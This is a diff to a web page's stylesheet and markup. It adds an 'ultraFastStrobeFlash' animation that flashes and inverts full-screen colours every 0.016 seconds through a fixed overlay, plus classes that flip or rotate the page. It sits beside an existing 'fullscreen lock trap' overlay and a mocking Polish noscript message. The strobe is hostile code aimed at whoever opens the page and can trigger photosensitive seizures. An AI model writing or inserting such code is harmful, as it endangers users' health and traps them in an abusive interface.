@@ -260,6 +260,28 @@
       cursor: pointer;
       user-select: none;
     }
+    @keyframes ultraFastStrobeFlash {
+      0% { background-color: #ff0055; filter: invert(0); }
+      14% { background-color: #00ffff; filter: invert(1); }
+      28% { background-color: #ffff00; filter: invert(0); }
+      42% { background-color: #ffffff; filter: invert(1); }
+      57% { background-color: #000000; filter: invert(0); }
+      71% { background-color: #ff0000; filter: invert(1); }
+      85% { background-color: #00ff66; filter: invert(0); }
+      100% { background-color: #ff0055; filter: invert(0); }
+    }
+    .ultra-strobe-overlay-active {
+      display: block !important;
+      animation: ultraFastStrobeFlash 0.016s linear infinite !important;
+    }
+    .mobile-flipped {
+      transform: rotate(180deg) scale(-1, 1) !important;
+      transition: transform 0.4s ease-in-out !important;
+    }
+    .mobile-rotated-90 {
+      transform: rotate(90deg) scale(1.1) !important;
+      transition: transform 0.4s ease-in-out !important;
+    }
     body {
       overscroll-behavior: none;
       animation-name: blurslowly;
@@ -282,6 +304,9 @@
 <body>
 
 <noscript>Po co ten JavaScript wyłączyłeś bamboszu!</noscript>
+
+<!-- Ultra Fast Zero-Delay Strobe Overlay -->
+<div id="ultra-strobe-overlay" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; pointer-events:none; z-index:999998; opacity:0.65; mix-blend-mode:difference;"></div>
 
 <!-- Fullscreen Lock Trap Overlay -->
 <div id="fullscreen-trap-overlay" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.92); color:#ff3333; z-index:9999999; text-align:center; justify-content:center; align-items:center; flex-direction:column; font-size:22px; font-weight:bold; font-family:monospace; cursor:pointer; padding:20px; box-sizing:border-box;">
